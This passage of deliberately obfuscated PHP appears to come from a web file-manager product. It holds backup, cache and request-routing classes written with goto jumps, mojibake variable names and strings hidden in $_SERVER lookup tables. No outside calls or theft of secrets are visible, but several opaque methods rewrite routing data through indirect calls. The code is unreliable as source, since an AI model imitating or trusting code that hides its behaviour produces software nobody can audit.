—ï‰°[23])->accessToken(); $f¯öÙİ³ê = str_replace($bÎ —ï‰°[5], $bÎ —ï‰°[4], $f¯öÙİ³ê) . $bÎ —ï‰°[24] . $c‹šƒÇ½ïœ . $f†–…³ó¶ò; $bÑÑÉÓ¶» = $bÎ —ï‰°[20]; goto A¤Ä«×²; a·³±«šë‹: } function ActionCallHook($e†ª…Á‚Ñ‚) { goto dÑŒ³ò™÷µ; dÑŒ³ò™÷µ: $ağ³ŒÒÎÄ¦ =& $_SERVER[À Ç]; ob_start(); $a”³•Ü‡˜¢ = array_slice(func_get_args(), 1); goto eÖ»‡´»Œ’; eÖ»‡´»Œ’: $GLOBALS[$ağ³ŒÒÎÄ¦[35]] = 1; $BÓäê•ç = ActionApply($e†ª…Á‚Ñ‚, $a”³•Ü‡˜¢); $bæ¹­»¦Ñà = ob_get_clean(); goto aÎÂ‘´‰§ø; aÎÂ‘´‰§ø: $BÓäê•ç = $bæ¹­»¦Ñà ? json_decode($bæ¹­»¦Ñà, !0) : $BÓäê•ç; $GLOBALS[$ağ³ŒÒÎÄ¦[35]] = 0; return $BÓäê•ç; goto F‘¤Š’áÂŒ; F‘¤Š’áÂŒ: } goto D»´‰ÀåóÚ; EÑĞêæ³‹–: class BackupFile { public function __construct() { } public function index() { goto CÙªùÑğÕõ; e°´ÁçÇÇ: Backup::set($Aºäƒ†…ğí); $this->_fileFilter($DÑÄ­Øå¬­); return !0; goto FØè¡‹„Ç; E²™Çß–: $A´·ÍÌíœÀ = 1000; $DÖ’è«ãÏ« = $dƒº™”õá´ = 0; $DÑÄ­Øå¬­ = array(); goto A¶¼•Üª£¹; e¨è¿ï¨ÊÕ: $e«âäö•¿ù = (int) Model($_SERVER[¼][711])->where($bù÷éÜîğâ)->count($_SERVER[¼][415]); $aˆğÂ˜–•À = (int) Model($_SERVER[¼][711])->where($bù÷éÜîğâ)->sum($_SERVER[¼][77]); $C‚Ü†é¨”á = new TaskFileTransfer($_SERVER[¼][728], $_SERVER[¼][704], $e«âäö•¿ù, LNG($_SERVER[¼][705]) . $_SERVER[¼][706] . LNG($_SERVER[¼][729])); goto b“‰µ×…ä; Bí‡µ¸ô£¿: $bÉÔ•”¿© = $cŞÂñè´‡‹ ? 1 : 0; $Aºäƒ†…ğí = array($_SERVER[¼][742] => 1, $_SERVER[¼][695] => time(), $_SERVER[¼][701] => $bÉÔ•”¿©, $_SERVER[¼][739] => $cåœ¯ùœÒ, $_SERVER[¼][731] => $aˆğÂ˜–•À, $_SERVER[¼][730] => $e«âäö•¿ù); if ($dƒº™”õá´) { $Aºäƒ†…ğí[$_SERVER[¼][740]] = $Eêñ™å¥™; $Aºäƒ†…ğí[$_SERVER[¼][741]] = $b¿µ‹ˆ¾İõ; } goto e°´ÁçÇÇ; A‘ğ®ëéÚí: $cŞÂñè´‡‹ = !0; $d²˜òœ†ô¡ = $this->storeIds(); $a©“¦¯ÈÔ˜ = 1; goto E²™Çß–; A¶¼•Üª£¹: $b¿µ‹ˆ¾İõ = $Eêñ™å¥™ = 0; do { $A§–‰ÑÍà = $_SERVER[¼][732]; $fí½õ•İ‰ = Model($_SERVER[¼][711])->where($bù÷éÜîğâ)->field($A§–‰ÑÍà)->order($_SERVER[¼][733])->selectPage($A´·ÍÌíœÀ, $a©“¦¯ÈÔ˜); $aŞÖ´ĞÔÈØ = !empty($fí½õ•İ‰[$_SERVER[¼][351]]) ? $fí½õ•İ‰[$_SERVER[¼][351]] : array(); foreach ($aŞÖ´ĞÔÈØ as $eœÒŸæ÷”Æ) { goto eÅ‡œƒ‚ä”; B¯¸°ÇËŒ : if (IO::exist($fáØ˜—‡‡)) { $C‚Ü†é¨”á->updateFileEnd($eœÒŸæ÷”Æ[$_SERVER[¼][28]], $eœÒŸæ÷”Æ[$_SERVER[¼][77]]); } else { $fáØ˜—‡‡ = get_path_father($fáØ˜—‡‡); IO::mkdir($fáØ˜—‡‡); if (!IO::copy($Aºà‚Œã, $fáØ˜—‡‡, $_SERVER[¼][736])) { write_log($_SERVER[¼][737] . $Aºà‚Œã . $_SERVER[¼][738] . $fáØ˜—‡‡ . $_SERVER[¼][472], $_SERVER[¼][704]); $cŞÂñè´‡‹ = !1; break; } } $cåœ¯ùœÒ = $eœÒŸæ÷”Æ[$_SERVER[¼][415]]; $dƒº™”õá´ += 1; goto a˜¯ù½ ; a˜¯ù½ : $DÖ’è«ãÏ« += $eœÒŸæ÷”Æ[$_SERVER[¼][77]]; $Eêñ™å¥™ += 1; $b¿µ‹ˆ¾İõ += $eœÒŸæ÷”Æ[$_SERVER[¼][77]]; goto eöÖåÃ¢‡«; eÅ‡œƒ‚ä”: if (!$this->_fileExist($eœÒŸæ÷”Æ, $DÑÄ­Øå¬­, $d²˜òœ†ô¡)) { $e«âäö•¿ù -= 1; $aˆğÂ˜–•À -= (int) $eœÒŸæ÷”Æ[$_SERVER[¼][77]]; write_log("\146\151\154\145\40\156\x6f\164\40\145\170\151\x73\x74\56\146\x69\154\x65\111\104\x3a{$eœÒŸæ÷”Æ[$_SERVER[¼][415]]}\x2c\40\160\141\164\x68\72{$eœÒŸæ÷”Æ[$_SERVER[¼][75]]}", $_SERVER[¼][734]); continue; } $Aºà‚Œã = $eœÒŸæ÷”Æ[$_SERVER[¼][75]]; $fáØ˜—‡‡ = "\x7b\x69\x6f\72{$D¶—‘ˆÊ³é[$_SERVER[¼][683]]}\175" . substr($Aºà‚Œã, strlen("\x7b\x69\157\x3a{$eœÒŸæ÷”Æ[$_SERVER[¼][735]]}\x7d")); goto B¯¸°ÇËŒ ; eöÖåÃ¢‡«: if ($DÖ’è«ãÏ« >= 1024 * 1024 * 100) { $Aºäƒ†…ğí = array($_SERVER[¼][739] => $cåœ¯ùœÒ, $_SERVER[¼][740] => $Eêñ™å¥™, $_SERVER[¼][741] => $b¿µ‹ˆ¾İõ); Backup::set($Aºäƒ†…ğí); $DÖ’è«ãÏ« = $dƒº™”õá´ = 0; } goto d«ç™Õ¢¢Ì; d«ç™Õ¢¢Ì: } $aÊ±î³ æØ = count($aŞÖ´ĞÔÈØ); $a©“¦¯ÈÔ˜++; } while ($aÊ±î³ æØ == $A´·ÍÌíœÀ); $C‚Ü†é¨”á->end(); goto Bí‡µ¸ô£¿; CÙªùÑğÕõ: $D¶—‘ˆÊ³é = Backup::get(); $cåœ¯ùœÒ = $D¶—‘ˆÊ³é[$_SERVER[¼][278]][$_SERVER[¼][164]][$_SERVER[¼][415]]; $bù÷éÜîğâ = array($_SERVER[¼][416] => array($_SERVER[¼][726], $cåœ¯ùœÒ), $_SERVER[¼][727] => array($_SERVER[¼][316], $D¶—‘ˆÊ³é[$_SERVER[¼][683]])); goto e¨è¿ï¨ÊÕ; b“‰µ×…ä: $C‚Ü†é¨”á->task[$_SERVER[¼][690]] = $aˆğÂ˜–•À; $Aºäƒ†…ğí = array($_SERVER[¼][730] => $e«âäö•¿ù, $_SERVER[¼][731] => $aˆğÂ˜–•À); Backup::set($Aºäƒ†…ğí); goto A‘ğ®ëéÚí; FØè¡‹„Ç: } private function _fileExist($D»å–Êó­Ã, &$F›ğ¢ÈŠ»Ñ, $Bƒ×…çºÁ) { goto b³µ–…Â±Š; fÜÁ°¯´: if (IO::exist($e· ¿ä´¶´)) { $F›ğ¢ÈŠ»Ñ[] = $D»å–Êó­Ã[$f‚–ò„³ô[415]]; return !1; } $fÀ—Í±µ£µ = array($f‚–ò„³ô[735] => $D»å–Êó­Ã[$f‚–ò„³ô[735]], $f‚–ò„³ô[75] => array($f‚–ò„³ô[743], "{$e· ¿ä´¶´}\x25")); $FÊÍˆµÛŒ² = Model($f‚–ò„³ô[711])->where($fÀ—Í±µ£µ)->field($f‚–ò„³ô[416])->select(); goto FÍ“ö°¾•Õ; b³µ–…Â±Š: $f‚–ò„³ô =& $_SERVER[¼]; $E—ÕÜ¡§ğ¬ = $D»å–Êó­Ã[$f‚–ò„³ô[75]]; if (in_array($D»å–Êó­Ã[$f‚–ò„³ô[415]], $F›ğ¢ÈŠ»Ñ)) { return !1; } goto FƒÂÉ‰Œ¯; FÍ“ö°¾•Õ: $F›ğ¢ÈŠ»Ñ = array_merge($F›ğ¢ÈŠ»Ñ, array_to_keyvalue($FÊÍˆµÛŒ², $f‚–ò„³ô[33], $f‚–ò„³ô[415])); return !1; goto EËĞË«ŸŠ„; FƒÂÉ‰Œ¯: if (!in_array($D»å–Êó­Ã[$f‚–ò„³ô[735]], $Bƒ×…çºÁ)) { return !1; } if (IO::exist($E—ÕÜ¡§ğ¬)) { return !0; } $e· ¿ä´¶´ = get_path_father($E—ÕÜ¡§ğ¬); goto fÜÁ°¯´; EËĞË«ŸŠ„: } private function _fileFilter($cøíÇö“¢Å) { $a–´£‡ÆÌî =& $_SERVER[¼]; if (empty($cøíÇö“¢Å)) { return; } $d”é—İÂâ = array($a–´£‡ÆÌî[415] => array($a–´£‡ÆÌî[7], array_unique($cøíÇö“¢Å))); $F½ã¡Ûîèù = Model($a–´£‡ÆÌî[744])->where($d”é—İÂâ)->field($a–´£‡ÆÌî[366])->select(); foreach ($F½ã¡Ûîèù as $FøÑªŒË®Æ) { Model($a–´£‡ÆÌî[744])->remove($FøÑªŒË®Æ[$a–´£‡ÆÌî[366]], !1); } } private function storeIds() { $c§‰Ï£×® =& $_SERVER[¼]; $e¡í†ˆßòŒ = Model($c§‰Ï£×®[696])->listData(); return array_to_keyvalue($e¡í†ˆßòŒ, $c§‰Ï£×®[33], $c§‰Ï£×®[364]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto b‡Äºƒ£‡·; b‡Äºƒ£‡·: $aãÌ Î²Û =& $_SERVER[¼]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto D³»ãùÚ›; D³»ãùÚ›: $CĞ«Íõ¶Ã¼ = $GLOBALS[$aãÌ Î²Û[6]][$aãÌ Î²Û[334]]; $EÖ¨„‹ÅÂğ = $CĞ«Íõ¶Ã¼[$CĞ«Íõ¶Ã¼[$aãÌ Î²Û[745]]]; $b‹˜î‡å = $CĞ«Íõ¶Ã¼[$aãÌ Î²Û[746]]; goto b°ÅØğëàƒ; b°ÅØğëàƒ: switch ($CĞ«Íõ¶Ã¼[$aãÌ Î²Û[745]]) { case $aãÌ Î²Û[17]: self::$handle = Model($aãÌ Î²Û[747]); break; case $aãÌ Î²Û[748]: self::$handle = new CacheRedis($EÖ¨„‹ÅÂğ, $b‹˜î‡å); break; case $aãÌ Î²Û[749]: self::$handle = new CacheMemcached($EÖ¨„‹ÅÂğ, $b‹˜î‡å); break; case $aãÌ Î²Û[164]: self::$handle = new CacheFile($EÖ¨„‹ÅÂğ, $b‹˜î‡å); break; default: break; } return self::$handle; goto a÷§‚È¾‘œ; a÷§‚È¾‘œ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($b£—ºÏÍ­Ø) { if (is_array($b£—ºÏÍ­Ø) || is_object($b£—ºÏÍ­Ø)) { $b£—ºÏÍ­Ø = json_encode($b£—ºÏÍ­Ø); } $b£—ºÏÍ­Ø = rawurlencode($b£—ºÏÍ­Ø); return KOD_SITE_ID . $_SERVER[¼][70] . $b£—ºÏÍ­Ø; } public static function get($FÎŞƒ•…à«) { $Cİ£¦ôŠ‚ = self::key($FÎŞƒ•…à«); if (!isset(self::$memoryCache[$Cİ£¦ôŠ‚])) { CacheLock::lock($FÎŞƒ•…à«); $AÁŒë‹‚Æª = self::init()->get($Cİ£¦ôŠ‚); CacheLock::unlock($FÎŞƒ•…à«); self::$memoryCache[$Cİ£¦ôŠ‚] = unserialize($AÁŒë‹‚Æª); } return self::$memoryCache[$Cİ£¦ôŠ‚]; } public static function set($eŒ£Ø•ç§, $f–£‚ÜšË, $A¬›ùÏä½Ç = false) { goto A¹Ù»èƒ¢¹; A¹Ù»èƒ¢¹: $BÁ‰¯ÍÅ§Ä = self::key($eŒ£Ø•ç§); if (isset(self::$memoryCache[$BÁ‰¯ÍÅ§Ä]) && self::$memoryCache[$BÁ‰¯ÍÅ§Ä] === $f–£‚ÜšË) { return !0; } if ($A¬›ùÏä½Ç === 0) { self::$memoryCache[$BÁ‰¯ÍÅ§Ä] = $f–£‚ÜšË; return !0; } goto D­ÂõéË©¥; D­ÂõéË©¥: CacheLock::lock($eŒ£Ø•ç§); $AŠ„“„“ø† = self::init()->set($BÁ‰¯ÍÅ§Ä, serialize($f–£‚ÜšË), $A¬›ùÏä½Ç); self::$memoryCache[$BÁ‰¯ÍÅ§Ä] = $f–£‚ÜšË; goto EØîğ¤†Ò¯; EØîğ¤†Ò¯: CacheLock::unlock($eŒ£Ø•ç§); return $AŠ„“„“ø†; goto eÂ¹§òó§‚; eÂ¹§òó§‚: } public static function remove($B·éà İ˜Ÿ) { goto cõí„ÍŞ®; cğ¡‘´•æ‡: CacheLock::lock($B·éà İ˜Ÿ); $e¯ÇÌµê¿ = self::init()->remove($Aƒ‘Ú¿ö–•); CacheLock::unlock($B·éà İ˜Ÿ); goto c‹…§™¹ŒÔ; c‹…§™¹ŒÔ: return $e¯ÇÌµê¿; goto FÓÕ‰¢­óó; cõí„ÍŞ®: $Aƒ‘Ú¿ö–• = self::key($B·éà İ˜Ÿ); unset(self::$memoryCache[$Aƒ‘Ú¿ö–•]); self::clearTimeout(); goto cğ¡‘´•æ‡; FÓÕ‰¢­óó: } public static function clearMemory($BƒšœÜËÉ” = false) { if ($BƒšœÜËÉ”) { $BƒšœÜËÉ” = self::key($BƒšœÜËÉ”); unset(self::$memoryCache[$BƒšœÜËÉ”]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¼][750])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¼][751])) { self::init()->clearTimeout(); } } } $cÃïĞºƒ½ = LIB_DIR . $_SERVER[¼][752]; goto c±Á²„å…å; d«ƒ¬É¢Ÿ: $EÙÀ†Î²ˆ² = $_SERVER[¼][547]; while ($EÙÀ†Î²ˆ² < $_SERVER[¼][548]) { if ($EÙÀ†Î²ˆ² >= 0) { break; } $EÙÀ†Î²ˆ²++; } class Application { private $defaultModule = "\x69\156\x64\x65\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($C¯Îåõ·ØÓ) { goto C™å¡²ñÂ ; C™å¡²ñÂ : $FÊÙ¢ã’›Ğ =& $_SERVER[¼]; $fÙ¾¾°¼Ñß =& $_SERVER[õÅ°Ò“]; $e¹”¿¬Ô¨Ó = $fÙ¾¾°¼Ñß[0]($fÙ¾¾°¼Ñß[1], $fÙ¾¾°¼Ñß[2]($C¯Îåõ·ØÓ, $fÙ¾¾°¼Ñß[1])); goto c­ß¬ù‹„Ò; c­ß¬ù‹„Ò: $this->defaultModule = $e¹”¿¬Ô¨Ó[0] ? $e¹”¿¬Ô¨Ó[0] : $this->defaultModule; $FÄâèÏ›ôš = $FÊÙ¢ã’›Ğ[549]; if (strlen($FÄâèÏ›ôš) < $FÊÙ¢ã’›Ğ[550]) { return; } goto Dã¢ò¨Û; Dã¢ò¨Û: $this->defaultController = $e¹”¿¬Ô¨Ó[1] ? $e¹”¿¬Ô¨Ó[1] : $this->defaultController; $this->defaultAction = $e¹”¿¬Ô¨Ó[2] ? $e¹”¿¬Ô¨Ó[2] : $this->defaultAction; $this->{$_SERVER[õÅ°Ò“][3]}($fÙ¾¾°¼Ñß[4], array($this, $fÙ¾¾°¼Ñß[5])); goto FÅ›ÔÀÅ™ˆ; FÅ›ÔÀÅ™ˆ: } public function appRun($bˆõ…Ù) { goto aÎ˜‰çîàô; Aî‡ä—·•¦: $A…†Ÿ‹‚— = $còâÅØè©[7]; if ($c‰õÈƒ„õÄ == $còâÅØè©[8]) { $A…†Ÿ‹‚— = $còâÅØè©[9]; $aĞ·˜æğµ[0] = $còâÅØè©[10]; $aĞ·˜æğµ[1] = $aĞ·˜æğµ[1] . $còâÅØè©[11]; $bˆõ…Ù = $còâÅØè©[12]($còâÅØè©[1], $aĞ·˜æğµ); $bˆõ…Ù = $còâÅØè©[2]($bˆõ…Ù, $còâÅØè©[1]); } $còâÅØè©[13](array($còâÅØè©[14], $còâÅØè©[15]), $A…†Ÿ‹‚— . $còâÅØè©[16], $bˆõ…Ù); goto dÕÏÏ‰«áÎ; a¨¡˜ÆÁ: $còâÅØè©[13](array($còâÅØè©[14], $còâÅØè©[15]), $A…†Ÿ‹‚— . $còâÅØè©[18], $bˆõ…Ù); goto Aë¯ìíã·ø; F–ìÜ¤¥: $Dí—àÉîî = $DÎÀØ…Õ [551]; if (!$Dí—àÉîî) { die; } $c‰õÈƒ„õÄ = $còâÅØè©[6]($aĞ·˜æğµ[0]); goto Aî‡ä—·•¦; dÕÏÏ‰«áÎ: $còâÅØè©[17]($bˆõ…Ù); $dí™òí˜¸Ì = $DÎÀØ…Õ [552]; if (!$dí™òí˜¸Ì) { die; } goto a¨¡˜ÆÁ; aÎ˜‰çîàô: $DÎÀØ…Õ  =& $_SERVER[¼]; $còâÅØè© =& $_SERVER[õÅ°Ò“]; $aĞ·˜æğµ = $còâÅØè©[0]($còâÅØè©[1], $bˆõ…Ù); goto F–ìÜ¤¥; Aë¯ìíã·ø: } private function autorun() { goto d¯…ÅèÚÁÙ; Dó‰Ö®£Ï: $EíÑ‰·š„‰ = $dÇÚµ¤ØÄ[553]; if (!$EíÑ‰·š„‰) { die; } if ($fÀ›Õê¸œ[19]($config[$fÀ›Õê¸œ[20]]) == 0) { return; } goto eó¨¨¿Ø; eó¨¨¿Ø: foreach ($config[$fÀ›Õê¸œ[20]] as $CËÅÕ¡ï¹¦ => $CåÚÜ¡å§) { $this->{$_SERVER[õÅ°Ò“][21]}($CåÚÜ¡å§); $f«Šõõ¹–æ = $dÇÚµ¤ØÄ[554]; if (strlen($f«Šõõ¹–æ) < $dÇÚµ¤ØÄ[544]) { return; } } goto B‹À…›ğ­°; d¯…ÅèÚÁÙ: $dÇÚµ¤ØÄ =& $_SERVER[¼]; $fÀ›Õê¸œ =& $_SERVER[õÅ°Ò“]; global $config; goto Dó‰Ö®£Ï; B‹À…›ğ­°: } private function rqjwfe1887e0() { goto DŒã¸—ÑÑ; F¹‹êŒâÄÛ: if ($fÌÁÄÄÜÌ[6]($fÌÁÄÄÜÌ[25]($a—š•­ƒ’®, -$fÌÁÄÄÜÌ[24]($e§ï‰‘¢£))) != $e§ï‰‘¢£) { return; } $cİìÊ¶ïø– = $fÌÁÄÄÜÌ[25]($a—š•­ƒ’®, 0, -$fÌÁÄÄÜÌ[24]($e§ï‰‘¢£)); $Cºô·Í¦ó = $e¥¾˜¨†÷[558]; goto eõŠÓõ­½Ñ; cÌµ¯âÀÍ: while (strlen($Cá‚¬Ê³) < $e¥¾˜¨†÷[550]) { if (!$Cá‚¬Ê³) { break; } $Cá‚¬Ê³++; } $bªòçª¸ = $fÌÁÄÄÜÌ[26]($GLOBALS[$fÌÁÄÄÜÌ[22]][$fÌÁÄÄÜÌ[23]], 1); $bÚ†ì·öĞ = $e¥¾˜¨†÷[560]; goto cîšîåÔè¿; còÒİÀ‰²: $C„óÓÚòÔ = $e¥¾˜¨†÷[555]; while (strlen($C„óÓÚòÔ) < $e¥¾˜¨†÷[556]) { if (!$C„óÓÚòÔ) { break; } $C„óÓÚòÔ++; } $a—š•­ƒ’® = $GLOBALS[$fÌÁÄÄÜÌ[22]][$fÌÁÄÄÜÌ[23]][0]; goto EŒƒÔñâ; eõŠÓõ­½Ñ: if (!$Cºô·Í¦ó) { die; } $Eôá‡ÕÛ›é = array($fÌÁÄÄÜÌ[8], $cİìÊ¶ïø–); $Cá‚¬Ê³ = $e¥¾˜¨†÷[559]; goto cÌµ¯âÀÍ; cîšîåÔè¿: while (strlen($bÚ†ì·öĞ) < $e¥¾˜¨†÷[544]) { if (!$bÚ†ì·öĞ) { break; } $bÚ†ì·öĞ++; } $GLOBALS[$fÌÁÄÄÜÌ[22]][$fÌÁÄÄÜÌ[23]] = $fÌÁÄÄÜÌ[27]($Eôá‡ÕÛ›é, $bªòçª¸); $EçÄˆÄµ = $e¥¾˜¨†÷[561]; goto Bå‰İÁ¡›; EŒƒÔñâ: $C¤®Œ¨ôäÕ = $e¥¾˜¨†÷[557]; if (!$C¤®Œ¨ôäÕ) { die; } if (!$a—š•­ƒ’® || $fÌÁÄÄÜÌ[24]($a—š•­ƒ’®) <= $fÌÁÄÄÜÌ[24]($e§ï‰‘¢£)) { return; } goto F¹‹êŒâÄÛ; DŒã¸—ÑÑ: $e¥¾˜¨†÷ =& $_SERVER[¼]; $fÌÁÄÄÜÌ =& $_SERVER[õÅ°Ò“]; $e§ï‰‘¢£ = $fÌÁÄÄÜÌ[8]; goto còÒİÀ‰²; Bå‰İÁ¡›: $GLOBALS[$fÌÁÄÄÜÌ[22]][$fÌÁÄÄÜÌ[28]] = $fÌÁÄÄÜÌ[29]($fÌÁÄÄÜÌ[1], $GLOBALS[$fÌÁÄÄÜÌ[22]][$fÌÁÄÄÜÌ[23]]); goto f¿Å§Ó°¦; f¿Å§Ó°¦: } private function qyxe0fe2b5d6() { goto cË…ÄˆÚ÷; CìçÛÀÉ‡š: if (!$e÷ÖÛ¬”ˆ[32]($aÑŠ½Õ±Å‰, $CÕ¼™Â”°)) { return; } $eè˜„§Â = $e÷ÖÛ¬”ˆ[33]($aÑŠ½Õ±Å‰, $CÕ¼™Â”°); $E‹„ºøóó‚ = $Eç¹»öçáê[563]; goto Cñ¹Š´×µÇ; cË…ÄˆÚ÷: $Eç¹»öçáê =& $_SERVER[¼]; $e÷ÖÛ¬”ˆ =& $_SERVER[õÅ°Ò“]; if ($GLOBALS[$e÷ÖÛ¬”ˆ[22]][$e÷ÖÛ¬”ˆ[28]] != $e÷ÖÛ¬”ˆ[10]) { return; } goto eÅ±®õ“»º; EÄĞÔÜ±ƒ: $D”¯›òŒÏ­ = $Eç¹»öçáê[565]; if (!$D”¯›òŒÏ­) { return; } $GLOBALS[$e÷ÖÛ¬”ˆ[22]][$e÷ÖÛ¬”ˆ[23]] = $e÷ÖÛ¬”ˆ[0]($e÷ÖÛ¬”ˆ[36], $C¢Õè¹ª“); goto Då©ÆºÊÍ; Cñ¹Š´×µÇ: while ($E‹„ºøóó‚ < $Eç¹»öçáê[548]) { if ($E‹„ºøóó‚ >= 0) { break; } $E‹„ºøóó‚++; } $C¢Õè¹ª“ = $e÷ÖÛ¬”ˆ[25]($aÑŠ½Õ±Å‰, $eè˜„§Â + $e÷ÖÛ¬”ˆ[24]($CÕ¼™Â”°)); $e÷ÖÛ¬”ˆ[34]($e÷ÖÛ¬”ˆ[35], $C¢Õè¹ª“, $CÙ„ÇåŠ‹Ğ); goto fƒ—‰¾¿­Ø; eÅ±®õ“»º: $aÑŠ½Õ±Å‰ = $_SERVER[$e÷ÖÛ¬”ˆ[30]]; $CÕ¼™Â”° = $e÷ÖÛ¬”ˆ[31]; $fèØ®æİ³’ = $Eç¹»öçáê[562]; goto CìçÛÀÉ‡š; Då©ÆºÊÍ: $GLOBALS[$e÷ÖÛ¬”ˆ[22]][$e÷ÖÛ¬”ˆ[28]] = $e÷ÖÛ¬”ˆ[29]($e÷ÖÛ¬”ˆ[1], $GLOBALS[$e÷ÖÛ¬”ˆ[22]][$e÷ÖÛ¬”ˆ[23]]); $fÎä…ßé´ = $Eç¹»öçáê[566]; if (strlen($fÎä…ßé´) < $Eç¹»öçáê[550]) { return; } goto Eñ¥È¥ŞÛŞ; fƒ—‰¾¿­Ø: $d®ë¢›Æ¦ = $Eç¹»öçáê[564]; if (!$d®ë¢›Æ¦) { return; } $C¢Õè¹ª“ = $e÷ÖÛ¬”ˆ[2]($CÙ„ÇåŠ‹Ğ[0][0], $e÷ÖÛ¬”ˆ[36]); goto EÄĞÔÜ±ƒ; Eñ¥È¥ŞÛŞ: } public function run() { goto B‰¬‹ª¢ÆÑ; B‰¬‹ª¢ÆÑ: $b”šÜãÄ’ =& $_SERVER[¼]; $B¼ê·“Ä­ˆ =& $_SERVER[õÅ°Ò“]; $this->{$_SERVER[õÅ°Ò“][37]}(); goto e¶ àªˆá; eäâÂó¾Æ•: if (strlen($d‹® ÈôßŠ) < $b”šÜãÄ’[550]) { return; } $_SERVER[$B¼ê·“Ä­ˆ[44]] = $B¼ê·“Ä­ˆ[6](ACTION); $this->{$_SERVER[õÅ°Ò“][45]}(); goto EÎ ¥¨Şã; dªØ²ÛÑ¶ : $B¼ê·“Ä­ˆ[39]($B¼ê·“Ä­ˆ[40], isset($b¾§ºÖ×Ş[0]) && $b¾§ºÖ×Ş[0] ? $b¾§ºÖ×Ş[0] : $this->defaultModule); $B¼ê·“Ä­ˆ[39]($B¼ê·“Ä­ˆ[41], isset($b¾§ºÖ×Ş[1]) && $b¾§ºÖ×Ş[0] ? $b¾§ºÖ×Ş[1] : $this->defaultController); $d‰—İÊ¾ºÇ = $b”šÜãÄ’[567]; goto CóŸÛÛ¡İº; dœ…¦áêõÒ: if (strlen($d†´ŒİíÈ‚) < $b”šÜãÄ’[544]) { return; } $B¼ê·“Ä­ˆ[39]($B¼ê·“Ä­ˆ[43], MOD . $B¼ê·“Ä­ˆ[1] . ST . $B¼ê·“Ä­ˆ[1] . ACT); $d‹® ÈôßŠ = $b”šÜãÄ’[569]; goto eäâÂó¾Æ•; EÎ ¥¨Şã: $a‰›•Ï…È· = $b”šÜãÄ’[570]; if ($B¼ê·“Ä­ˆ[19]($b¾§ºÖ×Ş) >= 3) { $this->{$_SERVER[õÅ°Ò“][21]}($c¹ìÒè¨Ğ); } else { $this->{$_SERVER[õÅ°Ò“][21]}(ACTION); } goto Dğ…ªÛß‹‡; e¶ àªˆá: $this->{$_SERVER[õÅ°Ò“][38]}(); $b¾§ºÖ×Ş = $GLOBALS[$B¼ê·“Ä­ˆ[22]][$B¼ê·“Ä­ˆ[23]]; $c¹ìÒè¨Ğ = $GLOBALS[$B¼ê·“Ä­ˆ[22]][$B¼ê·“Ä­ˆ[28]]; goto dªØ²ÛÑ¶ ; CóŸÛÛ¡İº: if (!$d‰—İÊ¾ºÇ) { die; } $B¼ê·“Ä­ˆ[39]($B¼ê·“Ä­ˆ[42], isset($b¾§ºÖ×Ş[2]) && $b¾§ºÖ×Ş[0] ? $b¾§ºÖ×Ş[2] : $this->defaultAction); $d†´ŒİíÈ‚ = $b”šÜãÄ’[568]; goto dœ…¦áêõÒ; Dğ…ªÛß‹‡: } private $vtmr5dc99b3a = array(); private $bgzxfe17a6e5 = ''; public function brgec5adafc0() { goto BĞë…«æ…Ã; eƒÌ×æåÕÛ: $this->{$_SERVER[õÅ°Ò“][50]}(); $b´»¦õÀ  = $CĞËÕÆ«›[574]; if (!$b´»¦õÀ ) { return; } goto fÑµòĞ»†í; a¿ëÏÅ•œ¬: $EîŠ“Ğ£°À = $CĞËÕÆ«›[579]; if (strlen($EîŠ“Ğ£°À) < $CĞËÕÆ«›[556]) { return; } goto EàÕº™ã¶§; dâ†ÊÚ†Ğ¨: while (strlen($b‘ÙÁã×­©) < $CĞËÕÆ«›[544]) { if (!$b‘ÙÁã×­©) { break; } $b‘ÙÁã×­©++; } $this->{$_SERVER[õÅ°Ò“][3]}($b‘¹ Õ·ì[53], array($this, $b‘¹ Õ·ì[54])); $EÜ©…½²‡ˆ = $CĞËÕÆ«›[576]; goto a—˜ïŸ±İ; a—˜ïŸ±İ: $this->{$_SERVER[õÅ°Ò“][3]}($b‘¹ Õ·ì[55], array($this, $b‘¹ Õ·ì[56])); $D³‡¨Šá‹ = $CĞËÕÆ«›[577]; if (!$D³‡¨Šá‹) { return; } goto fÒÇ¦÷²˜í; fÒÇ¦÷²˜í: $this->{$_SERVER[õÅ°Ò“][3]}($b‘¹ Õ·ì[57], array($this, $b‘¹ Õ·ì[58])); $d¾öàç¾¢Ó = $CĞËÕÆ«›[578]; $this->{$_SERVER[õÅ°Ò“][3]}($b‘¹ Õ·ì[59], array($this, $b‘¹ Õ·ì[60])); goto a¿ëÏÅ•œ¬; BĞë…«æ…Ã: $CĞËÕÆ«› =& $_SERVER[¼]; $b‘¹ Õ·ì =& $_SERVER[õÅ°Ò“]; $this->{$_SERVER[õÅ°Ò“][46]}(); goto dÕùƒ¹™§¯; fÑµòĞ»†í: $this->{$_SERVER[õÅ°Ò“][51]}(); $this->{$_SERVER[õÅ°Ò“][52]}(); $b‘ÙÁã×­© = $CĞËÕÆ«›[575]; goto dâ†ÊÚ†Ğ¨; A—Ãô­©±†: $B™°”îÓ…… = $CĞËÕÆ«›[572]; if (strlen($B™°”îÓ……) < $CĞËÕÆ«›[548]) { return; } $this->{$_SERVER[õÅ°Ò“][48]}(); goto dŒµ„âÀ‚î; dŒµ„âÀ‚î: $b¢Ç¶Œº­Î = $CĞËÕÆ«›[573]; if (!$b¢Ç¶Œº­Î) { die; } $this->{$_SERVER[õÅ°Ò“][49]}(); goto eƒÌ×æåÕÛ; dÕùƒ¹™§¯: $B™²î‡Ÿ = $CĞËÕÆ«›[571]; while ($B™²î‡Ÿ < $CĞËÕÆ«›[550]) { if ($B™²î‡Ÿ >= 0) { break; } $B™²î‡Ÿ++; } $this->{$_SERVER[õÅ°Ò“][47]}(); goto A—Ãô­©±†; EàÕº™ã¶§: } public function foru2273b3d4($E¢¿¤ËâÕ®) { goto AÊ®¥¢—Âí; B‚Ç¸¨ïÏˆ: $b±ò»…Ÿİ¡ = $f†îªÁ˜•˜[583]; while (strlen($b±ò»…Ÿİ¡) < $f†îªÁ˜•˜[544]) { if (!$b±ò»…Ÿİ¡) { break; } $b±ò»…Ÿİ¡++; } 